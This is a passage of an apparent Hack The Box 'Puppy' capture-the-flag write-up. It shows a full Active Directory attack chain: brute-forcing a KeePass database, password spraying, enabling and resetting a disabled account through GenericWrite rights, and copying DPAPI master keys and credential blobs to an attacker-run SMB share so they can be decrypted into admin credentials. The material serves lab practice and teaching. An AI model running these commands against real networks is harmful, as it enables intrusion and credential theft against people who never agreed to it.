 KeePassXC2.7.9:Win64.msi           A 34394112  Sun Mar 23 030912 2025
 Projects                            D        0  Sat Mar  8 115336 2025
 recovery.kdbx                       A     2677  Tue Mar 11 222546 2025
                                     5080575 blocks of size 4096. 1545105 blocks available
 smb: \\>  get recovery.kdbx
 getting file \\recovery.kdbx of size 2677 as recovery.kdbx 6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
 smb: \\> 
```

Lets try to crack `recovery.kdbx` file

```python
(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ sudo apt install keepassxc
```

```python
─(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ wget <https://raw.githubusercontent.com/r3nt0n/keepass4brute/master/keepass4brute.sh>
--2025-05-18 17:36:24--  <https://raw.githubusercontent.com/r3nt0n/keepass4brute/master/keepass4brute.sh>
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8000::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8001::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... failed: Connection timed out.
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2820 (2.8K) [text/plain]
Saving to: ‘keepass4brute.sh’

keepass4brute.sh                100%[=====================================================>]   2.75K  --.-KB/s    in 0.01s   

2025-05-18 17:45:30 (211 KB/s) - ‘keepass4brute.sh’ saved [2820/2820]

┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$ chmod +x keepass4brute.sh 
```

Lets try this shit !

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/puppy]
└─$  ./keepass4brute.sh recovery.kdbx  /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
<https://github.com/r3nt0n/keepass4brute> 
```

<figure><img src="../../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

👉 **We found the password 'liverpool' and extracted the passwords and information from the `recovery.kdbx` file into an XML format file named `keepass_dump.xml`.**

Let's check for accessible SMB shares:

```bash
smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

In the output, I notice a DEV share that appears to be intended for PUPPY-DEVS group members, but our current user doesn't have access to it

Now I can export the contents of the database:

```bash
keepassxc-cli export --format=xml recovery.kdbx > keepass_dump.xml
```

When prompted, I enter the password: `liverpool`

### Finding Credentials in the KeePass Database

Let's create a Python script to extract usernames and passwords from the XML file:

```python
import xml.etree.ElementTree as ET
tree = ET.parse('keepass_dump.xml')
root = tree.getroot()
for entry in root.iter('Entry'):
    username = None
    password = None
    for string in entry.findall('String'):
        key = string.find('Key').text
        value = string.find('Value').text
        if key == 'UserName':
            username = value
        elif key == 'Password':
            password = value
    if username or password:
        print(f"User: {username}, Password: {password}")
```

Running this script reveals several credentials, including:

* JamieLove2025!
* HJKL2025!
* Antman2025!
* Steve2025!
* ILY2025!

Let's extract just the passwords into a file:

```bash
python3 extract_keepass.py | awk -F'Password: ' '{print $2}' > passwords_only.txt
```

### Password Spraying

Now, I'll try these passwords against the user accounts we discovered earlier:

```bash
crackmapexec smb 10.10.11.70 -u users.txt -p passwords_only.txt --continue-on-success
```

In the output, I identify a valid credential pair:

* **Username:** ant.edwards
* **Password:** Antman2025!

```
SMB    10.10.11.70    445    DC    [+] PUPPY.HTB\\ant.edwards:Antman2025!
```

### Second Privilege Escalation: Targeting adam.silver

Let's run BloodHound again with the new credentials:

```bash
bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All -o bloodhound_results.json -ns 10.10.11.70
```

After analyzing the results, I discover that `ant.edwards` has `GenericWrite` permissions on the `adam.silver` user account. This means we can modify this account, including enabling it if it's disabled and resetting its password.

Let's check if we can write to the adam.silver account:

```bash
bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' get writable --detail | grep -E "distinguishedName: CN=.*DC=PUPPY,DC=HTB" -A 10
```

The output confirms we have extensive write permissions on adam.silver's account.

Let's check the status of adam.silver's account:

```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

```
SMB    10.10.11.70    445    DC    [-] PUPPY.HTB\\ADAM.SILVER:Password@987 STATUS_ACCOUNT_DISABLED
```

The account is disabled. Let's enable it and set a password:

```bash
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```

```
[-] ['ACCOUNTDISABLE'] property flags removed from ADAM.SILVER's userAccountControl
```

Now, let's set a password for the account:

```bash
rpcclient -U 'puppy.htb\\ant.edwards%Antman2025!' 10.10.11.70 -c "setuserinfo ADAM.SILVER 23 Password@987"
```

Let's verify our access:

```bash
crackmapexec smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
```

```
SMB    10.10.11.70    445    DC    [+] PUPPY.HTB\\ADAM.SILVER:Password@987
```

Let's also check WinRM access:

```bash
crackmapexec winrm 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

```
HTTP    10.10.11.70    5985    DC    [+] PUPPY.HTB\\ADAM.SILVER:Password@987 (Pwn3d!)
```

Great! We now have access to adam.silver's account.

### Accessing as adam.silver and Finding the User Flag

Let's connect using Evil-WinRM:

```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@987'
```

Once connected, I can access the user flag:

```powershell
*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents> cd ../Desktop
*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop> type user.txt
```

**User Flag:** `xx45203f370ae16dxxxxxxxxx`

### Exploring for Further Privilege Escalation

Let's continue exploring the system:

```powershell
*Evil-WinRM* PS C:\\> dir
```

I discover a Backups folder:

```powershell
*Evil-WinRM* PS C:\\Backups> dir
```

```
Directory: C:\\Backups

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a----    3/8/2025 8:22 AM    4639546    site-backup-2024-12-30.zip
```

Let's download this file for analysis:

```powershell
*Evil-WinRM* PS C:\\Backups> download site-backup-2024-12-30.zip
```

### Analyzing the Site Backup

After extracting the ZIP file, I examine its contents:

```bash
unzip site-backup-2024-12-30.zip -d ./puppy
cd ./puppy
```

I find an interesting backup configuration file: `nms-auth-config.xml.bak`

```bash
cat nms-auth-config.xml.bak
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
  <server>
    <host>DC.PUPPY.HTB</host>
    <port>389</port>
    <base-dn>dc=PUPPY,dc=HTB</base-dn>
    <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
    <bind-password>ChefSteph2025!</bind-password>
  </server>
  <!-- Additional configuration details omitted -->
</ldap-config>
```

This file contains credentials for steph.cooper:

* **Username:** steph.cooper
* **Password:** ChefSteph2025!

### Third Privilege Escalation: Access as steph.cooper

Let's verify these credentials:

```bash
crackmapexec winrm 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!' -d PUPPY.HTB
```

```
HTTP    10.10.11.70    5985    DC    [+] PUPPY.HTB\\steph.cooper:ChefSteph2025! (Pwn3d!)
```

Great! Let's connect with Evil-WinRM:

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
```

### DPAPI Credential Harvesting

After connecting as steph.cooper, I'll look for stored credentials. In Windows, credentials are often protected using DPAPI.

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> dir C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\
```

```
Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:54 AM    414    C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

I also need the DPAPI master key:

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> dir C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\
```

```
Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:40 AM    740    556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-    2/23/2025 2:36 PM    24    Preferred
```

Now I'll download these files for offline decryption. First, I start an SMB server on my attacking machine:

```bash
mkdir -p ./share
impacket-smbserver share ./share -smb2support
```

Then on the target via Evil-WinRM:

```powershell
*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> copy "C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407" \\\\10.10.14.xx\\share\\masterkey_blob

*Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents> copy "C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\\\10.10.14.xx\\share\\credential_blob
```

### Offline DPAPI Credential Decryption

Now that I have the necessary files, I'll decrypt them using Impacket's DPAPI tool:

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

The decryption provides a master key:

```
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Now I'll use this key to decrypt the credential blob:

```bash
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -f credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```
[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target : Domain:target=PUPPY.HTB
Description :
Unknown :
Username : steph.cooper_adm
Unknown : FivethChipOnItsWay2025!
```

Great! I've discovered another set of credentials:

* **Username:** steph.cooper\_adm
* **Password:** FivethChipOnItsWay2025!

After successfully decrypting the DPAPI credentials, I obtained the account details `steph.cooper_adm:FivethChipOnItsWay2025!` which corresponds to a user with administrative privileges. With these elevated credentials, I was able to access the system and retrieve the root flag.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
